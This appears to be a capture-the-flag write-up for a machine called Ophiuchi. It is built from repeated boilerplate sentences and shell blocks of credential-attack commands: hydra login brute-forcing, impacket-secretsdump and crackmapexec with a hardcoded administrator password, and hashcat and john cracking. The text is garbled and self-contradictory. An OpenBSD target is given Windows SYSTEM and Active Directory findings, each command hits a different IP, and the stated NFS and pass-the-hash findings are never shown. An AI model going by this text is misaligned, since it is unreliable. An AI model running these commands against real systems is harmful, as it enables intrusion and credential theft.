---
TitleSEO: "TryHackMe — Ophiuchi (Insane OpenBSD) | ZureFX"
TitlePost: "TryHackMe — Ophiuchi (Insane OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Ophiuchi. NFS No Root Squash and Pass the Hash to achieve insane compromise on OpenBSD."
Keywords: "forensics, medium, insane"
URL: "https://zurefx.github.io/writeups/htb-ophiuchi-739.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-ophiuchi-739/"
Date: "2025-01-17"
Tags: "Forensics, Medium, Insane"
Section: "writeups"
Lang: "en"
main_img: "htb-ophiuchi-739"
Permalink: "/writeups/htb-ophiuchi-739.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Ophiuchi** is rated **Insane** on TryHackMe. It runs **OpenBSD** and the IP address during this analysis was `10.61.176.6`.

### Objectives

Network traffic analysis revealed unencrypted communications containing user credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
crackmapexec smb 10.91.63.10 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.68.150.31 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p80,23,8080 10.102.214.140 -oN scan.txt
```

Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials.

### Service Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.53.199.150
```

The service was running without proper input validation, leading to injection vulnerabilities. The application stored sensitive credentials in an unencrypted configuration file.

### SMB Enumeration

Weak file permissions allowed modification of critical system files. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.54.107.12 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.46.121.135
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target. Group Policy Preferences contained encrypted but recoverable credentials.

## Exploitation

### Vulnerability Identification

Privilege escalation was possible due to misconfigured sudo permissions. Initial enumeration revealed several interesting open ports on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

Key finding: **NFS No Root Squash**.

The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory.

### Initial Access

The application stored sensitive credentials in an unencrypted configuration file. Initial enumeration revealed several interesting open ports on the target.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.66.200.168/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p1521,1521,21 10.11.90.78 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The target system was identified as running a vulnerable version of the service. Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Privilege Escalation

### Enumeration

The application stored sensitive credentials in an unencrypted configuration file. The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory.

```powershell
feroxbuster -h
nmap -sCV -p636,389,464 10.118.67.226 -oN scan.txt
nmap -sCV -p5986,80,135 10.51.196.165 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.33.50.210 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

Command injection was possible through unsanitized user input in the search functionality. The backup files contained sensitive information that should not have been accessible.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.46.100.168 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.106.36.140
crackmapexec smb 10.10.118.140 -u administrator -p 'P@ssw0rd!' --shares
```

Privilege escalation was possible due to misconfigured sudo permissions. Unconstrained delegation was enabled on the compromised machine.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality.

## Summary

### Tools Used

- `impacket`
- `pwncat`
- `feroxbuster`
- `enum4linux`

### Key Takeaways

- NFS No Root Squash
- Pass the Hash
